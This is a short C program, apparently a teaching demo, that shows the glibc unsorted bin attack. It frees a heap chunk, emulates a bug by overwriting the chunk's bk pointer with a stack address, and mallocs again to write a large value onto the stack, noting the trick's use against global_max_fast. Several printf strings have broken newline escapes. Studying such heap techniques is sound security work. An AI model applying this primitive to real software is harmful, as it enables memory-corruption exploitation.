//仅能用于泄漏不能用于malloc，因为无法满足双向列表的限制
#include <stdio.h>
#include <stdlib.h>
int main(){
    printf("This file demonstrates unsorted bin attack by write a large unsigned long value into stackn");
    printf("In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attacknn");
    unsigned long stack_var=0;
    printf("Let's first look at the target we want to rewrite on stack:\n");
    printf("%p: %ldn\n", &stack_var, stack_var);
    unsigned long *p=malloc(400);
    printf("Now, we allocate first normal chunk on the heap at: %pn",p);
    printf("And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()nn");
    malloc(500);
    free(p);
    printf("We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
           "point to %pn",(void*)p[1]);
    //------------VULNERABILITY-----------
    p[0]=(unsigned long)0; // would not affect fd
    p[1]=(unsigned long)(&stack_var-2); // would ONLY affect bk
    printf("Now emulating a vulnerability that can overwrite the victim->bk pointern");
    printf("And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
    //------------------------------------
    malloc(400);
    printf("Let's malloc again to get the chunk we just free. During this time, target should has already been "
           "rewrite:\n");
    printf("%p: %pn", &stack_var, (void*)stack_var);
//    malloc(400); // would fail, since double list need fake_chunk->bk==unsorted chunk
}